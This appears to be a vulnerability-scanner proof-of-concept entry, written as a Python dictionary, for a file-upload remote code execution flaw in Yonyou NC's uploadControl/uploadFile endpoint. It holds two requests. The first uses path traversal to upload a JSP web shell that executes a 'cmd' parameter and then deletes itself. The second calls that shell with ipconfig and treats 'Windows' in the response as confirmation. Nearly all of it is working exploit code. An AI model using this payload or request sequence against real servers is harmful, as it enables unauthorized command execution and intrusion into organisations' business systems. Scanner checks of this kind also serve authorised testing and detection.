{
        'name': '用友 NC uploadControl/uploadFile 文件上传致RCE漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/mp/initcfg/../uploadControl/uploadFile',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/94.0.2687.94 Safari/537.36',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6',
                'Connection': 'close'
            },
            'data': '''------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\nContent-Disposition: form-data; name="file"; filename="rce.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\nContent-Disposition: form-data; name="submit"\r\n\r\n上传\r\n------WebKitFormBoundaryHHaZAYecVOf5sfa6--''',
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/mp/uploadFileDir/rce.jsp?cmd=ipconfig',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/94.0.2687.94 Safari/537.36',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'Windows'
        }}]
    }